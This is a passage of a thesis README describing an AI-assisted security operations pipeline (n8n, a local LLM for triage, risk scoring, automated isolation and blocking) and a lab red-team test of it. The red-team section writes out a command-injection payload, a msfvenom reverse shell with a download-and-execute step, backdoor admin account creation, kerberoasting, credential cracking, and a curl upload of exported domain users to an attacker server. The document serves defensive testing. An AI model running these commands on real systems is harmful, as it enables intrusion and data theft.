```javascript
// Build prompt for AI model
// HTTP Request node → Ollama API
// URL: http://192.168.2.150:11434/api/generate

const alert = $('Merge Alert with OSINT').first().json;
const osint = $('OSINT Summary').first().json;

const prompt = `You are a SOC analyst. Analyze the following security alert and provide a structured triage response.

ALERT:
Title: ${alert.title}
Source IP: ${alert.src_ip} (${alert.src_asset?.name} - ${alert.src_role})
Destination IP: ${alert.dst_ip}
Timestamp: ${alert.timestamp}
Process: ${alert.process_name || 'N/A'}
Command Line: ${alert.command_line || 'N/A'}

OSINT ENRICHMENT:
Malicious indicators found: ${osint.osint_summary.detection.malicious}
${osint.osint_summary.malicious_indicators.map(i => `- ${i.type}: ${i.value}`).join('\n')}

ASSET CONTEXT:
${JSON.stringify(alert.src_asset, null, 2)}

Provide your analysis in the following exact format:

### Alert Summary
[2-3 sentence summary of what happened]

### Affected Asset & Context
[Asset details and why they are relevant]

### Key Indicators & Evidence
[Bullet list of key indicators]

### OSINT Findings
[What the threat intelligence revealed]

### Initial Assessment & Risk Level
[HIGH/MEDIUM/LOW with reasoning]

### Recommended Next Steps
[Numbered list of recommended actions]`;

return [{
  json: {
    model: "qwen2.5:7b",
    prompt: prompt,
    stream: false
  }
}];
```

**`[MORE INFORMATION NEEDED — example of actual AI response received, showing the structured output format, response time observed during testing]`**

### 8.6 Store AI Reasoning in MongoDB

```javascript
// HTTP Request node → MongoDB Atlas Data API, or direct driver via n8n MongoDB node
// [MORE INFORMATION NEEDED — whether MongoDB n8n community node was used,
//  or HTTP API, exact collection name and document structure]

return items.map(item => {
  return {
    json: {
      alert_id: item.json.alert_id,
      title: item.json.title,
      timestamp: new Date().toISOString(),
      ai_reasoning: item.json.ai_response,
      osint_summary: item.json.osint_summary,
      risk_score: item.json.risk_score,
      final_verdict: item.json.final_verdict
    }
  };
});
```

---

## 9. Phase 7 — Risk Scoring Engine

The risk scoring engine is a single JavaScript node that runs after OSINT enrichment and AI triage.

```javascript
// Full risk scoring engine
// [This is the actual implemented code — included in full for reproducibility]

const TRUSTED_DOMAINS = ["windowsupdate.com", "microsoft.com", "azureedge.net"];

function isTrustedDomain(domain) {
  if (!domain) return false;
  return TRUSTED_DOMAINS.some(d => domain.includes(d));
}

function isWindowsUpdate(alert) {
  return (
    alert.user_agent?.includes("Microsoft-Delivery-Optimization") ||
    alert.urls?.some(u => u.includes("msdownload")) ||
    isTrustedDomain(alert.domain)
  );
}

function scoreItem(item) {
  let score = 0;
  const alert = item.alert || item;
  const osint = item.osint_summary || {};
  const title = (alert.title || "").toLowerCase();
  const flow = (alert.asset_flow || "").toLowerCase();
  const role = (alert.src_role || "").toLowerCase();

  // Factor 1: OSINT
  if (osint.detection?.malicious > 10) score += 30;
  else if (osint.detection?.malicious > 0) score += 15;
  if (osint.reputation?.abuse_score > 50) score += 15;

  // Factor 2: Behavioral (mutually exclusive tiers)
  if (title.includes("kerberoast") || flow.includes("credential access")) {
    score += 60;
  } else if (title.includes("admin account creation") || flow.includes("persistence")) {
    score += 50;
  } else if (title.includes("discovery") || flow.includes("discovery")) {
    score += 30;
  }

  // Factor 3: Asset context
  if (role.includes("domain controller")) score += 25;
  else if (role.includes("server")) score += 15;
  if (alert.severity >= 5) score += 25;
  else if (alert.severity === 4) score += 15;
  score += (alert.soc_priority || 1) * 5;

  // Factor 4: Process/command signals
  if (alert.command_lines?.some(cmd => cmd.toLowerCase().includes("executionpolicy bypass"))) score += 20;
  if (alert.process_names?.some(p => p.toLowerCase().includes("printspoofer"))) score += 40;
  if (alert.process_names?.some(p => p.toLowerCase().includes("sandcat"))) score += 35;
  if (alert.command_lines?.some(cmd => cmd.includes(":8888"))) score += 25;

  // Factor 5: Correlation
  if (item.occurrences > 2) score += 10;
  if (item.related_alerts?.length > 2) score += 10;

  // Factor 6: Benign override (hard cap)
  if (isWindowsUpdate(alert)) score = Math.min(score, 20);

  return Math.max(0, Math.min(100, Math.round(score)));
}

function verdictFromScore(score) {
  if (score >= 70) return "HIGH";
  if (score >= 40) return "MEDIUM";
  return "LOW";
}

// Apply scoring to all items
const result = items.map(item => {
  const i = item.json;
  const score = scoreItem(i);
  i.risk_score = score;
  i.final_verdict = verdictFromScore(score);
  return { json: i };
});

return result;
```

---

## 10. Phase 8 — Decision Engine and Incident Response

### 10.1 Decision Engine Node

```javascript
// Maps verdict + alert type to structured decision object
return items.map(item => {
  const i = item.json;
  const verdict = i.final_verdict;
  const alert = i.alert || {};
  const score = i.risk_score || 0;

  let decision = { action: null, priority: null, playbook: null, reason: null };

  if (verdict === "HIGH") {
    decision.action = "create_case";
    decision.priority = score >= 90 ? "P1" : "P2";
    if (alert.alert_type === "powershell_execution") {
      decision.playbook = "EDR_Containment";
    } else if (alert.alert_type === "web_activity") {
      decision.playbook = "Web_Server_Compromise";
    } else {
      decision.playbook = "Generic_Threat_Investigation";
    }
    decision.reason = "High risk behavior + correlation detected";
  } else if (verdict === "MEDIUM") {
    decision.action = "create_alert";
    decision.priority = "P3";
    decision.playbook = "Threat_Hunting";
    decision.reason = "Suspicious behavior requires investigation";
  } else {
    if (alert.alert_type === "benign_update_activity") {
      decision.action = "auto_close";
      decision.reason = "Known benign update traffic";
    } else {
      decision.action = "log_only";
      decision.reason = "Low risk signal";
    }
    decision.priority = "P5";
    decision.playbook = "None";
  }

  i.decision = decision;
  return { json: i };
});
```

### 10.2 Switch Node — Severity Routing

```
Switch node routes by decision.action:

Output 0: create_case  → HIGH response branch
Output 1: create_alert → MEDIUM response branch
Output 2: log_only     → LOW response branch
Output 3: auto_close   → Suppress / close
```

### 10.3 LOW Severity — Notify Only

```javascript
// Build Markdown report
const a = $input.first().json;

const report = `### 🟡 SOC Alert: ${a.title}
---
### Alert Summary
${a.ai_triage?.summary || 'No AI summary available.'}

### Affected Asset
${a.src_asset?.name} (${a.src_ip}) → ${a.dst_ip}

### Risk Score
${a.risk_score}/100 — ${a.final_verdict}

### Recommended Next Steps
${a.ai_triage?.recommendations || 'Review manually.'}
---
*Report generated by Qwen2.5:7b*`;

// POST to Mattermost webhook
// URL: http://192.168.2.250:8065/hooks/[WEBHOOK_ID]
// Body: { "text": report }
```

### 10.4 MEDIUM Severity — Notify + Create Case in TheHive

```javascript
// 1. Send notification (same as LOW)

// 2. Create TheHive Case
// POST http://192.168.2.250:9000/api/case
{
  "title": `[MEDIUM] ${alert.title}`,
  "description": report,
  "severity": 2,
  "tags": ["medium", "auto-created", alert.source_type],
  "tasks": [
    { "title": "Review OSINT findings" },
    { "title": "Investigate asset behavior" },
    { "title": "Determine if escalation needed" }
  ]
}

// 3. Add observables to case
// POST http://192.168.2.250:9000/api/case/[CASE_ID]/observable
// [MORE INFORMATION NEEDED — observable types and format used for each indicator]
```

### 10.5 HIGH Severity — Full Automated Response

#### Step 1: Host Isolation via Velociraptor

```javascript
// Map hostname to Velociraptor client ID
// GET http://192.168.2.200:8889/api/v1/SearchClients?query=[HOSTNAME]
// Auth: [VELOCIRAPTOR_API_KEY]

// Then issue quarantine artifact
// POST http://192.168.2.200:8889/api/v1/CollectArtifact
{
  "client_id": "[CLIENT_ID]",
  "artifacts": ["Windows.Host.Quarantine"],
  "parameters": {
    "env": [{"key": "Quarantine", "value": "true"}]
  }
}
```

**`[MORE INFORMATION NEEDED — Velociraptor API authentication method (gRPC vs HTTP), exact artifact name used for quarantine, screenshot of Velociraptor showing quarantined host]`**

#### Step 2: Extract IoCs and Route

```javascript
// IoC Extractor node
// Pulls malicious indicators from osint_results
const malicious = items[0].json.osint_summary.malicious_indicators;

return malicious.map(ioc => ({
  json: {
    ...items[0].json,
    ioc_type: ioc.type,
    ioc_value: ioc.indicator
  }
}));

// IoC Response Router — Switch node:
// ip → Block IP in OPNsense
// domain → Add to malicious_domains alias in OPNsense
// hash → Hash Hunt + Delete via Velociraptor
```

#### Step 3: Block IP in OPNsense

```javascript
// POST to OPNsense API — add IP to blocklist alias
// POST https://192.168.2.254/api/firewall/alias/addHost/blocklist_ips
// Auth: Basic [API_KEY:API_SECRET]
{
  "address": "[MALICIOUS_IP]"
}

// Apply changes
// POST https://192.168.2.254/api/firewall/filter/apply
{}
```

**`[MORE INFORMATION NEEDED — OPNsense alias name used for blocklist, whether aliases were pre-created or created by the workflow, screenshot of OPNsense alias after blocking]`**

#### Step 4: Hash Hunt + Whitelist Check + File Delete via Velociraptor

```javascript
// Step 4a: Hunt for file by hash on affected host
// Velociraptor custom artifact: Windows.Hash.Hunt
// [MORE INFORMATION NEEDED — custom artifact VQL content for hash-based file search]

// Step 4b: Whitelist check
const BENIGN_HASH_WHITELIST = [
  // [MORE INFORMATION NEEDED — list of known-good hashes added to whitelist]
  "abc123...",  // Windows system file
];

const hash = item.json.ioc_value;
const isWhitelisted = BENIGN_HASH_WHITELIST.includes(hash.toLowerCase());

if (isWhitelisted) {
  // Skip deletion, log only
  return [{ json: { ...item.json, deletion_skipped: true, reason: "Hash in whitelist" } }];
}

// Step 4c: Delete file via Velociraptor custom artifact
// [MORE INFORMATION NEEDED — custom artifact VQL for file deletion,
//  how file path is derived from hash hunt result]
```

#### Step 5: Create High-Severity Case + Full Notification

```javascript
// TheHive case creation (same as MEDIUM but with P1/P2 priority)
// Plus response action log appended to case description

const response_summary = `
## Automated Response Actions Taken

- ✓ Host isolated: ${alert.host}
- ✓ IPs blocked: ${blocked_ips.join(', ')}
- ✓ Domains blocked: ${blocked_domains.join(', ')}
- ✓ Files deleted: ${deleted_files.join(', ')}
- ✗ Skipped (whitelist): ${whitelisted_files.join(', ')}
`;

// Mattermost HIGH alert notification
const high_report = `### 🔴 HIGH SEVERITY ALERT — ${alert.title}
${ai_triage_report}

---
${response_summary}

*[Open TheHive Case](http://192.168.2.250:9000)*`;
```

**`[MORE INFORMATION NEEDED — screenshot of high-severity Mattermost notification, TheHive case with observables and response log, Velociraptor case showing file deletion result]`**

---

## 11. Phase 9 — Red Team Evaluation

### 11.1 Setup

```
Attacker machine: Kali Linux (172.16.210.x)
Target 1: Web Server — 192.168.1.120 (reachable via NAT on Firewall A)
Target 2: PDC — 192.168.1.100 (reachable only after lateral movement)
Domain: kabul-uni.edu
CALDERA server: Running on attacker machine
```

### 11.2 Phase 1 — Reconnaissance

```bash
# Network scan from Kali
sudo nmap -sS -sV -p- [FIREWALL_A_WAN_IP]

# Identifies:
# - Port 80/443 open (web server via NAT)
# - Service: IIS on Windows Server
```

**`[MORE INFORMATION NEEDED — nmap output screenshot showing discovered services]`**

### 11.3 Phase 2 — Initial Exploitation

```
# Command injection in Mutillidae II
# Vulnerable parameter in DNS Lookup tool

# Test payload:
google.com & whoami

# Confirms command execution as iis apppool\defaultapppool
```

**`[MORE INFORMATION NEEDED — screenshot of command injection in Mutillidae II, response showing whoami output]`**

### 11.4 Phase 3 — Reverse Shell + CALDERA Agent

```bash
# On Kali — create reverse shell payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=[KALI_IP] LPORT=4444 \
  -f exe -o shell.exe

# Serve payload
python3 -m http.server 8000

# Set up listener
msfconsole -q -x "use exploit/multi/handler; \
  set payload windows/x64/meterpreter/reverse_tcp; \
  set LHOST [KALI_IP]; run"

# Trigger download + execution via command injection
google.com & powershell -c "Invoke-WebRequest -Uri http://[KALI_IP]:8000/shell.exe -OutFile shell.exe"
google.com & .\shell.exe

# Deploy CALDERA agent via Meterpreter session
# [MORE INFORMATION NEEDED — CALDERA agent deployment command via Meterpreter]
```

**`[MORE INFORMATION NEEDED — Meterpreter session screenshot, CALDERA agent check-in screenshot showing web server as managed host]`**

### 11.5 Phase 4 — Privilege Escalation (CALDERA)

```
CALDERA Adversary: Custom Privilege Escalation
Ability: PrintSpoofer / SeImpersonate
Result: SYSTEM shell on web server
```

**`[MORE INFORMATION NEEDED — CALDERA operation screenshot showing privilege escalation ability execution, before/after whoami showing SYSTEM]`**

### 11.6 Phase 5 — Persistence

```
CALDERA Adversary: Persistence on Web Server
Ability: Create local admin account

# Equivalent manual command:
net user FakeAdmin P@ssword123! /add
net localgroup Administrators FakeAdmin /add
```

### 11.7 Phase 6 — Kerberoasting + Lateral Movement

```bash
# Kerberoasting via Rubeus (deployed via CALDERA)
Rubeus.exe kerberoast /dc:192.168.1.100 /domain:kabul-uni.edu \
  /format:hashcat /outfile:hash.txt

# Retrieve hashes from web server
curl http://192.168.1.120/mutillidae/rubeus/hash.txt -o hash.txt

# Crack with Hashcat
hashcat -m 13100 -a 0 hash.txt wordlist.txt -o cracked.txt

# Lateral movement via WinRM using cracked credentials
$password = ConvertTo-SecureString "admin@123" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("kabul-uni.edu\administrator", $password)
Enter-PSSession -ComputerName PDC.kabul-uni.edu -Credential $cred
```

**`[MORE INFORMATION NEEDED — Rubeus output screenshot, hashcat cracking screenshot, WinRM session screenshot on PDC]`**

### 11.8 Phase 7 — Data Exfiltration

```powershell
# On PDC via WinRM session — export all domain users
Get-ADUser -Filter * -Properties * | `
  Select-Object Name, SamAccountName, EmailAddress, Title, Department, MobilePhone | `
  Export-Csv -Path "C:\Users\Public\leaked.csv" -NoTypeInformation

# Upload to attacker-controlled HTTP server
curl.exe -F "files=@C:\Users\Public\leaked.csv" http://[KALI_IP]:8005/upload
```

**`[MORE INFORMATION NEEDED — screenshot of exfiltrated CSV content, Python HTTP server receiving the upload]`**

### 11.9 Pipeline Results

After each phase, alerts appeared in the automated pipeline. Here is the summary:

![SIEM Alerts Dashboard](images/siem-alerts-all-phases.png)

| Phase | Alert Fired | AI Triage | Severity | Response Action |
|---|---|---|---|---|
| 1 | Discovery Command Burst | ✓ | LOW | Mattermost notify |
| 2 | Suspicious PowerShell Args | ✓ | MEDIUM | Notify + TheHive case |
| 3 | IIS PowerShell Payload Drop | ✓ | HIGH | Isolate + Block + Delete |
| 4 | Token Impersonation | ✓ | HIGH | Isolate + Block |
| 5 | Local Admin Account Created | ✓ | HIGH | Isolate + Block |
| 6 | Kerberoasting Detection | ✓ | HIGH | Isolate + Block |
| 7 | IDS Outbound HTTP Upload | ✓ | MEDIUM | Notify + TheHive case |

---

## 12. Results Summary

### What the System Did Automatically

- **Triage:** Every alert received an AI-generated triage report with no analyst input
- **OSINT:** All IP, domain, and hash indicators enriched automatically before triage
- **Response (HIGH):** Host isolation executed in < 30 seconds of alert classification
- **Reporting:** Structured Mattermost reports delivered for 100% of alerts in real time
- **False positive protection:** Windows Update traffic correctly capped at score 20, never escalated

![Example Mattermost Report](images/mattermost-high-alert-report.png)
![TheHive Cases Created](images/thehive-cases.png)

---

## 13. Lessons Learned and Limitations

### What Worked Well

- The modular n8n architecture made it easy to add or swap individual components
- Local Qwen2.5:7b produced consistently structured outputs once prompt engineering was tuned
- The whitelist mechanism worked correctly — zero false file deletions during testing
- The OPNsense API integration was fast and reliable for automated blocking

### Limitations

- **Simulated environment only** — not tested under production alert volumes
- **Fixed risk score weights** — weights were manually tuned, not learned from data
- **No analyst feedback loop** — incorrect AI triage cannot feed back into model improvement
- **CALDERA dependency** — post-exploitation phases relied on CALDERA; real-world attackers behave differently
- **Eve.json cron job** — a proper Suricata-to-SO2 integration would be cleaner than cron-based forwarding

### Future Improvements

- Deploy in a live environment and benchmark under real alert volumes
- Replace fixed weights with a machine learning scoring model trained on historical incidents
- Add analyst feedback mechanism in Mattermost (thumbs up/down reactions mapped back to alert record)
- Extend automated response to medium-severity alerts with additional confirmation safeguards
- Integrate agentic AI for multi-step autonomous investigation

---

## Repository Structure

```
semi-autonomous-soc/
├── README.md
├── docker/
│   └── docker-compose.yml          # All SOAR stack services
├── n8n-workflows/
│   ├── main-workflow.json           # Export of main n8n workflow
│   └── ai-agent-subworkflow.json   # Export of AI subworkflow
├── siem-rules/
│   ├── rule-discovery.json
│   ├── rule-powershell.json
│   ├── rule-privilege-escalation.json
│   ├── rule-persistence.json
│   └── rule-kerberoasting.json
├── velociraptor/
│   └── custom-artifacts/            # VQL artifacts for hash hunt + delete
├── scripts/
│   └── forward_eve.sh               # OPNsense eve.json forwarding script
└── risk-scoring/
    └── scoring-engine.js            # Standalone risk scoring node code
```

---

*Built as a bachelor's thesis proof of concept. All tools used are open-source.*
*Questions or contributions welcome via GitHub Issues.*
